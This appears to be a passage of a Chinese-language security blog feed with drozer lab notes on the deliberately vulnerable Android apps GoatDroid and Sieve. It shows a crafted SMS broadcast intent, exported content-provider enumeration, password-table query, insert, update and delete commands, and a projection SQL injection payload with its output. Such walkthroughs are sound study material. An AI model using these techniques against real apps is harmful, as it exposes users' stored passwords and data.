&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Send Something
此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有&lt;code>org.owasp.goatdroid.fourgoats.SOCIAL_SMS&lt;/code>這個action才會被接收，並且觸發onReceive這個function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;manifest&lt;/span> &lt;span style="color:#a6e22e">versionCode=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">versionName=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1.0&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">package=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;application&lt;/span> &lt;span style="color:#a6e22e">theme=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131361870&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131296266&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">icon=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2130837632&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">debuggable=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;receiver&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send SMS&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.broadcastreceivers.SendSMSNowReceiver&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;intent-filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;action&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;/action&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/intent-filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/receiver&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/application&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/manifest&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message &amp;#34;Hello mate!&amp;#34;
&lt;/code>&lt;/pre>因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - content providers exported - DB Based</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---db-based">
 Test Sieve - content providers exported - DB Based
 &lt;a class="anchor" href="#test-sieve---content-providers-exported---db-based">#&lt;/a>
&lt;/h1>
&lt;p>如果想知道實際的狀況和content URI是什麼，可以參考&lt;a href="https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d">ChatGPT的說明&lt;/a>&lt;/p>
&lt;ol>
&lt;li>起手式
從以下command的結果可以知道&lt;code>com.mwr.example.sieve.DBContentProvider&lt;/code>和&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>的狀況，並且從結果可以知道URI的形式長怎樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path: /Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Type: PATTERN_LITERAL
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: com.mwr.example.sieve.READ_KEYS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: com.mwr.example.sieve.WRITE_KEYS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>逆向
實際去看&lt;code>DBContentProvider&lt;/code>這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">pwdb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PWDBHelper(getContext());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, PWTable.&lt;span style="color:#a6e22e">TABLE_NAME&lt;/span>, 100);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Keys&amp;#34;&lt;/span>, KEY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)&lt;/li>
&lt;li>query/insert/update/delete/sqli
&lt;ul>
&lt;li>query
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Simple Query&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>insert
根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id &lt;span style="color:#ae81ff">2&lt;/span> --string password bbb --string email aaa@bbb.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password bbb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email aaa@bbb.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>update
_id=2的data，被我們改掉了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span> --string password ccc --string email ddd@eee.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password ccc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email ddd@eee.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>delete
只剩下最一開始我們設定的data
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sqli
如下結果所示，的確存在sqli，並且可以得到完整的table
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 先嘗試丟一些trash byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;)&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM Passwords WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>我們也可以用drozer自動幫我們找
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - content providers exported - File SystemBased</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---file-systembased">
 Test Sieve - content providers exported - File SystemBased
 &lt;a class="anchor" href="#test-sieve---content-providers-exported---file-systembased">#&lt;/a>
&lt;/h1>
&lt;ol>
&lt;li>有關於基於File System的Content Provider - 逆向
在&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>中可以特別注意onCreate以及ParcelFileDescriptor這個funnction
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FileBackupProvider&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> ContentProvider {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.FileBackupProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>, DATABASE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
